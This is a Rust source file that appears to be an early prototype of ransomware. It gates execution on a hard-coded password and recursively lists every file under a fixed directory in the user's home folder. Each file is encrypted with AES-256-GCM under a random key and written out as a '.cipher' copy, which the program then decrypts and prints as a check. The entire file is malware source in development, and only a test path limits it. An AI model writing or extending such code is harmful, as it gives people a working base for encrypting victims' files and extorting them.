use std::fs::{self, File};
use std::env;
use std::io::{self, Write};
use std::path::{Path, PathBuf};
use std::process;

use aes_gcm::aead::Aead;
use aes_gcm::{
    aead::{KeyInit, OsRng},
    Aes256Gcm,
    Nonce,
};
use rand;
use pbkdf2::{
    password_hash::{
        // rand_core::OsRng,
        SaltString, PasswordHash, PasswordHasher, PasswordVerifier
    },
    Pbkdf2
};

fn main() {

    // Password
    let password = b"danger!";

    // Parse command line arguments
    let args: Vec<String> = env::args().collect();

    if &args[1].as_bytes() != &password {
        eprintln!(":: [-] :: Incorrect password");
        process::exit(1);
    }

    let salt = SaltString::generate(&mut OsRng);

    // Hash password to PHC string
    let password_hash = Pbkdf2.hash_password(password, &salt)
        .expect(":: [-] :: Hashing password");

    println!("Password Hash :: {:?}", password_hash);

    // Get home directory
    let mut path = if cfg!(target_os = "windows") {
        env::var_os("USERPROFILE").map(PathBuf::from)
    } else {
        env::var_os("HOME").map(PathBuf::from)
    }.expect(":: [-] :: Could not get home directory");

    // [TODO]: Make sure its safe - for now
    path.push("tmp");
    path.push("git");
    path.push("rust");
    path.push("ransomware");
    path.push("src");
    path.push("target");
    println!("{:?}", path);

    // Discover files
    let ret = discover_dirs(&path).unwrap_or_else(|err|{
        eprintln!(":: [-] :: {}", err);
        process::exit(1);
    });

    // Iterate over files
    for file in ret {

        // Read file content
        let content_res = fs::read(&file);
        let content = match content_res {
            Ok(res) => {
                println!(":: [+] :: Content :: b :: {:?}", &res);
                println!(":: [+] :: Content :: s :: {}", String::from_utf8_lossy(&res).trim());
                res
            },
            Err(err) => {
                eprintln!(":: [-] :: Content :: {}", err);
                return
            }
        };

        // Generate random encryption key
        let key = Aes256Gcm::generate_key(OsRng);

        // Generate random nonce bytes
        let nonce_bytes = rand::random::<[u8; 12]>();
        let nonce = Nonce::from_slice(&nonce_bytes); // 96-bits, unique per message

        // Encrypt plain text
        let cipher = Aes256Gcm::new(&key);
        let ciphertext = cipher.encrypt(&nonce, content.as_ref())
            .expect(":: [-] :: Encrypt plain text");

        // Create new file
        let mut out_path = file.clone();
        out_path.set_extension("cipher");

        let mut file = File::create(out_path)
            .expect(":: [-] :: Creating file");

        file.write_all(&ciphertext)
            .expect(":: [-] :: Write ciphertext");

        // Decrypt ciphertext
        let plain_text = cipher.decrypt(&nonce, ciphertext.as_ref())
            .expect(":: [-] :: Decrypt ciphertext");

        println!(":: [+] :: Plain text :: {:?}", plain_text);
        println!(":: [+] :: Plain text :: {}", String::from_utf8_lossy(&plain_text) .trim());

    }

}

fn discover_dirs(path: &PathBuf) -> io::Result<Vec<PathBuf>> {
    let mut files = Vec::new();
    let entries = fs::read_dir(path)?;

    for entry in entries {
        let entry = entry?;
        let path = entry.path();

        if path.is_dir() {
            let mut sub_files = discover_dirs(&path)?;
            files.append(&mut sub_files);
        } else {
            files.push(path);
        }
    }

    Ok(files)
}
